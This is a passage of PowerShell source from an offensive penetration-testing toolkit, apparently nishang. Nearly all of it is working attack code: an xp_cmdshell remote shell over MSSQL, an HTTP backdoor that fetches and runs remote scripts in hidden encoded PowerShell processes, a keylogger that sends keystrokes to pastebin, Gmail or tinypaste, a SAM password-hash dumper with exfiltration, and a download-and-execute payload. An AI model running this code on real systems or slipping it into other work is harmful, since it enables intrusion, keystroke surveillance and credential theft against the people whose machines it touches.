    $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
    $Connection.Open()
    $Command = New-Object System.Data.SQLClient.SQLCommand
    $Command.Connection = $Connection
    $Command.CommandText = $query
    $Reader = $Command.ExecuteReader()
    $Connection.Close()

    }
  
    "Connecting to $ComputerName..." 
	start-sleep 3 
    Make-Connection "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
    "`nEnabling XP_CMDSHELL...`n"
    start-sleep 3
    Make-Connection "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
    write-host -NoNewline "Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): "
    $shell = read-host
    while($payload -ne "exit")
    {
        $Connection = New-Object System.Data.SQLClient.SQLConnection
        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
        $Connection.Open()
        $Command = New-Object System.Data.SQLClient.SQLCommand
        $Command.Connection = $Connection
        if ($shell -eq "P")
        {
            write-host "`n`nStarting PowerShell on the target..`n"
            write-host -NoNewline "PS $ComputerName> "
            $payload = read-host
            $cmd = "EXEC xp_cmdshell 'powershell.exe -Command `"& {$payload}`"'"
        }
        elseif ($shell -eq "S")
        {
            write-host "`n`nStarting SQL shell on the target..`n"
            write-host -NoNewline "MSSQL $ComputerName> "
            $payload = read-host
            $cmd = $payload
        }
        elseif ($shell -eq "C")
        {
            write-host "`n`nStarting cmd shell on the target..`n"
            write-host -NoNewline "CMD $ComputerName> "
            $payload = read-host
            $cmd = "EXEC xp_cmdshell 'cmd.exe /K $payload'"
        }
            
            
        $Command.CommandText = "$cmd"
        $Reader = $Command.ExecuteReader()
        while ($reader.Read()) {
            New-Object PSObject -Property @{
            Name = $reader.GetValue(0)
            }
        }
        $Connection.Close()
    }
    }
    Catch {
      $error[0]
    }
}


function HTTP-Backdoor
{

<#
.SYNOPSIS
Payload which queries a URL for instructions and then downloads and executes a powershell script.

.DESCRIPTION
This payload queries the given URL and after a suitable command (given by MagicString variable) is found, 
it downloads and executes a powershell script. The payload could be stopped remotely if the string at CheckURL matches
the string given in StopString variable. By using the exfile parameter, it would be possible to 

.PARAMETER CheckURL
The URL which the payload would query for instructions.

.PARAMETER PayloadURL
The URL from where the powershell script would be downloaded.

.PARAMETER MagicString
The string which would act as an instruction to the payload to proceed with download and execute.

.PARAMETER StopString
The string which if found at CheckURL will stop the payload.

PARAMETER exfil
Use this parameter to use exfiltration methods for returning the results.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.Example

PS > HTTP-Backdoor

The payload will ask for all required options.

.EXAMPLE
PS > HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis

Use above when using the payload from non-interactive shells.

.EXAMPLE
PS > HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis -exfil <devkey> <username> <password> <keyoutoption>

Use above command for using exfiltration methods.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>


    [CmdletBinding(DefaultParameterSetName="noexfil")]
    Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$PayloadURL,
    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$MagicString,
    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$username,
    [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [String]$password,
    [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )

    $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
    $modulename = $script:MyInvocation.MyCommand.Name
    $name = "$modulepath\$modulename"
    
    if ($exfil -eq $True)
    {
        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-HTTP-Backdoor $CheckURL $PayloadURL $MagicString $StopString $dev_key $username $password $keyoutoption $exfil"
        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
    }
    else
    {
        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-HTTP-Backdoor $CheckURL $PayloadURL $MagicString $StopString"
        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
    }
}



##################################################Logic for the HTTP-Backdoor.#######################################################
function Logic-HTTP-Backdoor($CheckURL, $PayloadURL, $MagicString, $StopString, $dev_key, $username, $password, $keyoutoption, $exfil)
{


    while($true)
    {
    $exec = 0
    start-sleep -seconds 5
    $webclient = New-Object System.Net.WebClient
    $filecontent = $webclient.DownloadString("$CheckURL")
    if($filecontent -eq $MagicString)
    {
        $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
        $pastevalue
        $exec++
        if ($exfil -eq $True)
        {
            $pastename = $env:COMPUTERNAME + " Results of HTTP Backdoor: "
            Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
        }
        if ($exec -eq 1)
        {
            Start-Sleep -Seconds 60
        }
    }
    elseif ($filecontent -eq $StopString)
    {
        break
    }
    }
  
    
}

#############################################Logs the keys in the context of current user.#################################################
function Keylogger
{

<#
.SYNOPSIS
Payload which logs keys.

.DESCRIPTION
This payload logs a user's keys and writes them to file key.log (I know its bad :|) in user's temp directory.
The keys can then be exfiltrated to pastebin|tinypaste|gmail|all as per selection. Saved keys could then be decoded
using the Parse_Key script.

.PARAMETER CheckURL
The URL which would contain the MagicString used to stop keylogging.

.PARAMETER MagicString
The string which when found at CheckURL will stop the keylogger.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > Keylogger
The payload will ask for all required options.

.EXAMPLE
PS > Keylogger http://example.com stopthis
Use above when using the payload from non-interactive shells or you don't want the payload to ask for any options.

.EXAMPLE
PS > Keylogger http://example.com stopthis -exfil <dev_key> <username> <pass> 2 
Use above when using the payload from non-interactive shells. This will exfiltrate keys to gmail.


.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>


    [CmdletBinding(DefaultParameterSetName="noexfil")]
    Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$username,
    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$password,
    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )

    $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
    $modulename = $script:MyInvocation.MyCommand.Name
    $name = "$modulepath\$modulename"
    
    if ($exfil -eq $True)
    {
        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Keylog $CheckURL $StopString"
        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
        $Argumentlist_Keypaste = StringtoBase64 -IsString "Import-Module $name;Logic-Keypaste $CheckURL $StopString $dev_key $username $password $keyoutoption $exfil"
        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist_Keypaste"
    }
    else
    {
        $Argumentlist = StringtoBase64 -IsString "Import-Module $name;Logic-Keylog $CheckURL $StopString"
        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist"
        $Argumentlist_Keypaste = StringtoBase64 -IsString "Import-Module $name;Logic-Keypaste $CheckURL $StopString"
        Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-encodedcommand $Argumentlist_Keypaste"
    }
}


function Logic-Keylog ($CheckURL, $StopString)
{
    
    $signature = @' 
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@ 
    $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru 
    $check = 0
    while ($true) 
    { 
        Start-Sleep -Milliseconds 40 
        $logged = "" 
        $result="" 
        $shift_state="" 
        $caps_state="" 
        for ($char=1;$char -le 254;$char++) 
        { 
            $vkey = $char 
            $logged = $getKeyState::GetAsyncKeyState($vkey) 
            if ($logged -eq -32767) 
            { 
                if(($vkey -ge 48) -and ($vkey -le 57)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                        if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                        { 
                            $result = "S-" + $vkey 
                        } 
                        else 
                        { 
                            $result = $vkey 
                        } 
                    } 
                elseif(($vkey -ge 64) -and ($vkey -le 90)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    $caps_state = [console]::CapsLock 
                    if(!(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) -xor $caps_state) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                        $result = $vkey 
                    } 
                } 
                elseif((($vkey -ge 186) -and ($vkey -le 192)) -or (($vkey -ge 219) -and ($vkey -le 222))) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                      $result = $vkey 
                    } 
                } 
                else 
                { 
                    $result = $vkey 
                } 
                $now = Get-Date; 
                $logLine = "$result " 
                $filename = "$env:temp\key.log" 
                Out-File -FilePath $fileName -Append -InputObject "$logLine" 

            }
        }
        $check++
        if ($check -eq 1000)
        {
            $webclient = New-Object System.Net.WebClient
            $filecontent = $webclient.DownloadString("$CheckURL")
            if ($filecontent -eq $StopString)
            {
                break
            }
        }
    }
}

function Logic-Keypaste($CheckURL, $StopString, $dev_key, $username, $password, $keyoutoption, $exfil)
{
    
    $check = 0
    while($true) 
    { 
        $read = 0
        Start-Sleep -Seconds 5 
        $pastevalue=Get-Content $env:temp\key.log 
        $read++
        if ($read -eq 30)
        {
            Out-File -FilePath $env:temp\key.log -Force -InputObject " " 
            $read = 0
        }
        $now = Get-Date; 
        $name = $env:COMPUTERNAME 
        $paste_name = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
        function Post_http($url,$parameters) 
        { 
            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
            $http_request.open("POST", $url, $false) 
            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
            $http_request.setRequestHeader("Content-length", $parameters.length); 
            $http_request.setRequestHeader("Connection", "close") 
            $http_request.send($parameters) 
            $script:session_key=$http_request.responseText 
            
        } 

        function Get-MD5()
        {
            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $utf8 = new-object -TypeName System.Text.UTF8Encoding
            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
            return $hash
        }

        if ($keyoutoption -eq "1")
        {
            Post_http "http://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
            Post_http "http://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
        }
        
        elseif ($keyoutoption -eq "2")
        {
            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
            $filename = "$env:TEMP\key.log"
            $smtpserver = “smtp.gmail.com”
            $msg = new-object Net.Mail.MailMessage
            $att = new-object Net.Mail.Attachment($filename)
            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
            $smtp.EnableSsl = $True
            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
            $msg.From = “$username@gmail.com”
            $msg.To.Add(”$username@gmail.com”)
            $msg.Subject = $paste_name
            $msg.Body = “New keys have arrived. Check the attachment.”
            $msg.Attachments.Add($att)
            $smtp.Send($msg)
        }

        elseif ($keyoutoption -eq "3")
        {
            
            $hash = Get-MD5
            Post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$paste_name&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
        }

        $check++
        if ($check -eq 1000)
        {
            $webclient = New-Object System.Net.WebClient
            $filecontent = $webclient.DownloadString("$CheckURL")
            if ($filecontent -eq $StopString)
            {
                break
            }
        }
    }
}


##########################################################Dump windows password hashes######################################
###Thanks David Kennedy###
###powerdump.rb from msf
function Get-PassHashes
{
[CmdletBinding(DefaultParameterSetName="noexfil")]
Param ( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
[Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
[Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String]$username,
[Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$password,
[Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
function LoadApi
{
    $oldErrorAction = $global:ErrorActionPreference;
    $global:ErrorActionPreference = "SilentlyContinue";
    $test = [PowerDump.Native];
    $global:ErrorActionPreference = $oldErrorAction;
    if ($test)
    {
        # already loaded
        return;
     }

$code = @'
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerDump
{
    public class Native
    {
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
     public static extern int RegOpenKeyEx(
        int hKey,
        string subKey,
        int ulOptions,
        int samDesired,
        out int hkResult);

    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
    extern public static int RegEnumKeyEx(
        int hkey,
        int index,
        StringBuilder lpName,
        ref int lpcbName,
        int reserved,
        StringBuilder lpClass,
        ref int lpcbClass,
        out long lpftLastWriteTime);

    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    extern public static int RegQueryInfoKey(
        int hkey,
        StringBuilder lpClass,
        ref int lpcbClass,
        int lpReserved,
        out int lpcSubKeys,
        out int lpcbMaxSubKeyLen,
        out int lpcbMaxClassLen,
        out int lpcValues,
        out int lpcbMaxValueNameLen,
        out int lpcbMaxValueLen,
        out int lpcbSecurityDescriptor,
        IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(
        int hKey);

        }
    } // end namespace PowerDump

    public class Shift {
        public static int   Right(int x,   int count) { return x >> count; }
        public static uint  Right(uint x,  int count) { return x >> count; }
        public static long  Right(long x,  int count) { return x >> count; }
        public static ulong Right(ulong x, int count) { return x >> count; }
        public static int    Left(int x,   int count) { return x << count; }
        public static uint   Left(uint x,  int count) { return x << count; }
        public static long   Left(long x,  int count) { return x << count; }
        public static ulong  Left(ulong x, int count) { return x << count; }
    }
'@

   $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
   $dllName = [PsObject].Assembly.Location
   $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
   $assemblies = @("System.dll", $dllName)
   $compilerParameters.ReferencedAssemblies.AddRange($assemblies)
   $compilerParameters.GenerateInMemory = $true
   $compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
   if($compilerResults.Errors.Count -gt 0) {
     $compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
   }

}

$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
$odd_parity = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function sid_to_key($sid)
{
    $s1 = @();
    $s1 += [char]($sid -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
    $s1 += $s1[0];
    $s1 += $s1[1];
    $s1 += $s1[2];
    $s2 = @();
    $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
    $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
    return ,((str_to_key $s1),(str_to_key $s2));
}

function str_to_key($s)
{
    $key = @();
    $key += [Shift]::Right([int]($s[0]), 1 );
    $key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
    $key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
    $key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
    $key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
    $key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
    $key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
    $key += $([int]($s[6]) -band 0x7F);
    0..7 | %{
        $key[$_] = [Shift]::Left($key[$_], 1);
        $key[$_] = $odd_parity[$key[$_]];
        }
    return ,$key;
}

function NewRC4([byte[]]$key)
{
    return new-object Object |
    Add-Member NoteProperty key $key -PassThru |
    Add-Member NoteProperty S $null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "encrypt" {
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    } -PassThru
}

function des_encrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $true)
}

function des_decrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $false)
}

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
{
    $des = new-object Security.Cryptography.DESCryptoServiceProvider;
    $des.Mode = [Security.Cryptography.CipherMode]::ECB;
    $des.Padding = [Security.Cryptography.PaddingMode]::None;
    $des.Key = $key;
    $des.IV = $key;
    $transform = $null;
    if ($doEncrypt) {$transform = $des.CreateEncryptor();}
    else{$transform = $des.CreateDecryptor();}
    $result = $transform.TransformFinalBlock($data, 0, $data.Length);
    return ,$result;
}

function Get-RegKeyClass([string]$key, [string]$subkey)
{
    switch ($Key) {
        "HKCR" { $nKey = 0x80000000} #HK Classes Root
        "HKCU" { $nKey = 0x80000001} #HK Current User
        "HKLM" { $nKey = 0x80000002} #HK Local Machine
        "HKU"  { $nKey = 0x80000003} #HK Users
        "HKCC" { $nKey = 0x80000005} #HK Current Config
        default {
            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
        }
    }
    $KEYQUERYVALUE = 0x1;
    $KEYREAD = 0x19;
    $KEYALLACCESS = 0x3F;
    $result = "";
    [int]$hkey=0
    if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
    {
    	$classVal = New-Object Text.Stringbuilder 1024
    	[int]$len = 1024
    	if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
    		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
    	{
    		$result = $classVal.ToString()
    	}
    	else
    	{
    		Write-Error "RegQueryInfoKey failed";
    	}
    	[PowerDump.Native]::RegCloseKey($hkey) | Out-Null
    }
    else
    {
    	Write-Error "Cannot open key";
    }
    return $result;
}

function Get-BootKey
{
    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    $b = new-object byte[] $($s.Length/2);
    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
    $b2 = new-object byte[] 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
    return ,$b2;
}

function Get-HBootKey
{
    param([byte[]]$bootkey);
    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
    $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
    if (-not $k) {return $null}
    [byte[]]$F = $k.GetValue("F");
    if (-not $F) {return $null}
    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
    $rc4 = NewRC4 $rc4key;
    return ,($rc4.encrypt($F[0x80..0x9F]));
}

function Get-UserName([byte[]]$V)
{
    if (-not $V) {return $null};
    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
}

function Get-UserHashes($u, [byte[]]$hbootkey)
{
    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
    if ($u.HashOffset + 0x28 -lt $u.V.Length)
    {
        $lm_hash_offset = $u.HashOffset + 4;
        $nt_hash_offset = $u.HashOffset + 8 + 0x10;
        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    elseif ($u.HashOffset + 0x14 -lt $u.V.Length)
    {
        $nt_hash_offset = $u.HashOffset + 8;
        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
}

function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
{
    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
    # LM Hash
    if ($enc_lm_hash)
    {
        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
    }

    # NT Hash
    if ($enc_nt_hash)
    {
        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
    }

    return ,($lmhash,$nthash)
}

function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
{
    $deskeys = sid_to_key $rid;
    $md5 = [Security.Cryptography.MD5]::Create();
    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
    $rc4 = NewRC4 $rc4_key;
    $obfkey = $rc4.encrypt($enc_hash);
    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
    return ,$hash;
}

function Get-UserKeys
{
    ls HKLM:\SAM\SAM\Domains\Account\Users |
        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
            Add-Member AliasProperty KeyName PSChildName -PassThru |
            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
}

function DumpHashes
{
    LoadApi
    $bootkey = Get-BootKey;
    $hbootKey = Get-HBootKey $bootkey;
    Get-UserKeys | %{
        $hashes = Get-UserHashes $_ $hBootKey;
        "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
    }
}
$pastevalue = DumpHashes
$pastevalue
    if ($exfil -eq $True)
        {
            $pastename = $env:COMPUTERNAME + "Password hashes: "
            Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
        }
}


####################################Download and Execute a powershell script#########################################################


function Download-Execute-PS
{

<#
.SYNOPSIS
Payload which downloads and executes a powershell script.

.DESCRIPTION
This payload downloads a powershell script from specified URL and then executes it on the target.

.PARAMETER ScriptURL
The URL from where the powershell script would be downloaded.

.EXAMPLE
PS > Download-Execute-PS http://pastebin.com/raw.php?i=jqP2vJ3x

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>

    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $ScriptURL)
    Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"));
    $pastevalue
}

#####################################Check credentials on remote computers and create sessions#########################################################

function Create-MultipleSessions
{
    
<#
.SYNOPSIS
Function which can check for credentials on remote computers and can open PSSessions if the credentials work.

.DESCRIPTION
The payload uses WMI to check a credential against given list of computers. Use the -Creds parameter to specify username and password. If the script is run
from a powershell session with local or global admin credentials (or from a powershell session started with hashes of such account using WCE), it should be used
without the -Creds parameter. Use the -CreateSessions parameter to create PSSessions. 

.PARAMETER filename
Path to the file which stores list of servers.

.PARAMETER Creds
Use this parameter to specify username (in form of domain\username) and password.

.PARAMETER CreateSessions
Use this parameter to make the script create PSSessions to targets on which the credentials worked.

.PARAMETER VerboseErrors
Use this parameter to get verbose error messages.

.EXAMPLE
PS > Create-MultipleSessions -filename .\servers.txt
